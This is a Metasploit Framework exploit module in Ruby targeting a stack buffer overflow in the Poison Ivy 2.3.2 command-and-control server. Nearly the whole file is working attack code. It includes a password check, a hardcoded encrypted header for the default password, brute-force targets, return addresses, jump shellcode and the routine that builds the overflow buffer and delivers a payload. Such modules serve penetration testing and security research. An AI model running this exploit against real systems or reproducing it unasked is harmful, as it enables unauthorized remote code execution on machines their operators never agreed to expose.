##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => "Poison Ivy 2.3.2 C&C Server Buffer Overflow",
			'Description'    => %q{
				This module exploits a stack buffer overflow in Poison Ivy 2.3.2 C&C server.
				The exploit does not need to know the password chosen for the bot/server
				communication. If the C&C is configured with the default 'admin' password,
				the exploit should work fine. In case of the C&C configured with another
				password the exploit can fail. The 'check' command can be used to determine
				if the C&C target is using the default 'admin' password.

				Hopefully an exploit try won't crash the Poison Ivy C&C process, just the thread
				responsible of handling the connection. Because of this the module provides the
				RANDHEADER option and a	bruteforce target. If RANDHEADER is used a random header
				will be used. If the bruteforce target is selected, a random header will be sent in
				case the default for the password 'admin' doesn't work. Bruteforce will stop after
				5 tries or a session obtained.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Andrzej Dereszowski', # Vulnerability Discovery
					'Gal Badishi', # Exploit and Metasploit module
					'juan vazquez' # Testing and little of Metasploit-fu
				],
			'References'     =>
				[
					[ 'URL', 'http://www.signal11.eu/en/research/articles/targeted_2010.pdf' ],
					[ 'URL', 'http://badishi.com/own-and-you-shall-be-owned' ]
				],
			'DisclosureDate' => "Jun 24 2012",
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'StackAdjustment'   => -4000,
					'Space'             => 10000,
					'BadChars'          => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
				[ 'Poison Ivy 2.3.2 / Windows XP SP3 / Windows 7 SP1',
					{
						'Ret' => 0x0041AA97, # jmp esp from "Poison Ivy 2.3.2.exe"
						'RWAddress' => 0x00401000,
						'Offset' => 0x806D,
						'PayloadOffset' => 0x75,
						'jmpPayload' => "\x81\xec\x00\x80\x00\x00\xff\xe4" # sub esp,0x8000 # jmp esp
					}
				],
					[ 'Poison Ivy 2.3.2 - Bruteforce / Windows XP SP3 / Windows 7 SP1',
						{
							'Ret' => 0x0041AA97, # jmp esp from "Poison Ivy 2.3.2.exe"
							'RWAddress' => 0x00401000,
							'Offset' => 0x806D,
							'PayloadOffset' => 0x75,
							'jmpPayload' => "\x81\xec\x00\x80\x00\x00\xff\xe4", # sub esp,0x8000 # jmp esp
							'Bruteforce' =>
								{
									'Start' => { 'Try' => 1 },
									'Stop'  => { 'Try' => 6 },
									'Step'  => 1,
									'Delay' => 2
								}
						}
					],
				],
			'DefaultTarget'  => 0
		))

		register_options(
			[
				Opt::RPORT(3460),
				OptBool.new('RANDHEADER', [true, 'Send random bytes as the header', false])
			], self.class)

		register_advanced_options(
			[
				OptInt.new('BruteWait', [ false, "Delay between brute force attempts", 2 ]),
			], self.class)

	end

	def check
		sig = "\x35\xe1\x06\x6c\xcd\x15\x87\x3e\xee\xf8\x51\x89\x66\xb7\x0f\x8b"
		lensig = [0x000015D0].pack("V")

		connect
		sock.put("\x00" * 256)
		response = sock.read(256)
		datalen = sock.read(4)
		disconnect

		if datalen == lensig
			if response[0, 16] == sig
				print_status("Password appears to be \"admin\"")
			else
				print_status("Unknown password - Bruteforce target or RANDHEADER can be tried and exploit launched until success.")
			end
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def single_exploit
		if datastore['RANDHEADER'] == true
			# Generate a random header - allows multiple invocations of the exploit if it fails because we don't know the password
			header = rand_text(0x20)
		else
			# This is the 32-byte header we want to send, encrypted with the default password ("admin")
			# We have a very good chance of succeeding even if the password was changed
			header = "\xe7\x77\x44\x30\x9a\xe8\x4b\x79\xa6\x3f\x11\xcd\x58\xab\x0c\xdf\x2a\xcc\xea\x77\x6f\x8c\x27\x50\xda\x30\x76\x00\x5d\x15\xde\xb7"
		end
		do_exploit(header)
	end

	def brute_exploit(brute_target)
		if brute_target['Try'] == 1
			print_status("Bruteforcing - Try #{brute_target['Try']}: Header for 'admin' password")
			# This is the 32-byte header we want to send, encrypted with the default password ("admin")
			# We have a very good chance of succeeding even if the password was changed
			header = "\xe7\x77\x44\x30\x9a\xe8\x4b\x79\xa6\x3f\x11\xcd\x58\xab\x0c\xdf\x2a\xcc\xea\x77\x6f\x8c\x27\x50\xda\x30\x76\x00\x5d\x15\xde\xb7"
		else
			print_status("Bruteforcing - Try #{brute_target['Try']}: Random Header")
			# Generate a random header - allows multiple invocations of the exploit if it fails because we don't know the password
			header = rand_text(0x20)
		end
		do_exploit(header)
	end

	def do_exploit(header)
		# Handshake
		connect
		print_status("Performing handshake...")
		sock.put("\x00" * 256)
		sock.get

		# Don't change the nulls, or it might not work
		xploit  = ''
		xploit << header
		xploit << "\x00" * (target['PayloadOffset'] - xploit.length)
		xploit << payload.encoded
		xploit << "\x00" * (target['Offset'] - xploit.length)
		xploit << [target.ret].pack("V") # ret to a jmp esp opcode
		xploit << [target['RWAddress']].pack("V") # Readable/writeable - will be cleaned by original ret 4 (esp will point to the next dword)
		xploit << target['jmpPayload'] # This comes immediately after ret - it is a setup for the payload (jmp back)

		# The disconnection triggers the exploit
		print_status("Sending exploit...")
		sock.put(xploit)
		select(nil,nil,nil,5)
		disconnect
	end

end

=begin

* ROP version of exploit(): Has been discarded at the moment because of two reasons:

(1) Poison Ivy fails to run on DEP enabled systems (maybe due to the unpacking process)
(2) When trying a unpacked version on DEP enabled systems windows/exec payload runs, but not meterpreter

=end
